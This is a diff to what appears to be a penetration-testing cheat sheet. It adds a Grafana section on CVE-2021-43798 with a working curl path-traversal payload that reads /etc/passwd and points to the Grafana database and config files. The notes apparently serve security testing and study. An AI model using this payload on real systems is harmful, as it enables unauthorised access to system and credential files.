@@ -108,6 +108,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [4** Bypass](#4-bypass)
   - [Application level Denial of Service](#application-level-denial-of-service)
   - [APIs attacks](#apis-attacks)
+  - [Grafana attacks](#grafana-attacks)
 - [Client-Side Attacks](#client-side-attacks)
   - [Client Information Gathering](#client-information-gathering)
   - [HTML applications](#html-applications)
@@ -2829,6 +2830,13 @@ Common API path convention: `/api_name/v1`
    ```
 2. Run the command `gobuster dir -u <TARGET> -w /usr/share/wordlists/wordlist.txt -p patterns`
 3. Inspect the endpoints fuond with `curl` and use recursion
+
+
+### <ins>Grafana attacks</ins>
+
+**CVE-2021-43798**: Grafana versions 8.0.0-beta1 through 8.3.0, except for patched versions, are vulnerable to directory traversal
+- `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
+  - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file
 
 
 ## Client-Side Attacks
